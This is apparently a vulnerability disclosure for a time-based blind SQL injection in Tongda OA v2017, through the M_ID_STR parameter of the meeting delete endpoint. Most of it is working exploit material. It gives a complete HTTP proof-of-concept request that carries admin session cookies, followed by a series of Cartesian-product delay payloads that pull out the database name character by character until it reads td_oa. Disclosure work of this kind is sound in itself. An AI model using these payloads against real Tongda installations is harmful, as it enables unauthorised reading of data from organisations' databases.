SQL injection vulnerability exists in Tongda OA

version:v2017

Route:/general/meeting/manage/delete.php
There is an injected parameter: $M_ID_STR
The code here is very concise. When $M_ID_STR is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/b3c07da4-445e-4120-b78b-1633d3f62d91)
There is a bypass situation in Tongda Global. Please see the payload below for the bypass method.
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/a0a264e6-f61c-43bd-ae7b-65ad81764192)
POC
```
GET /general/meeting/manage/delete.php?M_ID_STR=1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: USER_NAME_COOKIE=admin; SID_1=c8acd360; PHPSESSID=nirn1murprsta177fjc9e4egk1; OA_USER_ID=admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```
2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/c4e28f3f-23cc-490a-b80b-d9932d7fdafe)
Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time
```
1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/963eb498-193e-4a94-b76e-79f6e9681518)
The third digit is the character _
```
1)%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/c187908f-2a15-4b2f-ad2c-c478a291530c)
The fourth digit is the character o
```1)%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/0df8b11f-642f-480c-8a57-4c8a45c17da1)
The fifth digit is the character a
```1)%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/306af333-8465-43e9-8a3f-10f165418d1a)
Then through blind injection, you can determine that the database name is: td_oa

